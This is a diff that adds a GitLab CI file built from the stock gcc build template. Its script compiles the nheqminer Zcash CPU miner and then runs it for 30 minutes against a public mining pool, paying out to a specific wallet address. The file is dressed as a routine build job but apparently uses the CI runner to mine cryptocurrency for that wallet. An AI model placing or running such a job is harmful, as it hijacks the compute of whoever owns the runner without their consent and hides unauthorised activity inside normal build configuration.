@@ -1,0 +1,22 @@
+
+
+# This file is a template, and might need editing before it works on your project.
+# use the official gcc image, based on debian
+# can use verions as well, like gcc:5.2
+# see https://hub.docker.com/_/gcc/
+image: gcc
+
+build:
+  stage: build
+  # instead of calling g++ directly you can also use some build toolkit like make
+  # install the necessary build tools when needed
+  # before_script: 
+  #   - apt update && apt -y install make autoconf 
+  script: 
+    - cd cpu_xenoncat/Linux/asm/
+    - chmod +x assemble.sh
+    - sh assemble.sh
+    - cd ../../../Linux_cmake/nheqminer_cpu
+    - cmake .
+    - make -j $(nproc)
+    - timeout 30m /nheqminer_cpu -l eu1-zcash.flypool.org:3333 -u t1V3hWbCDmxfMuHQAwK8yeQzyfRm98szocK.lap -t 1
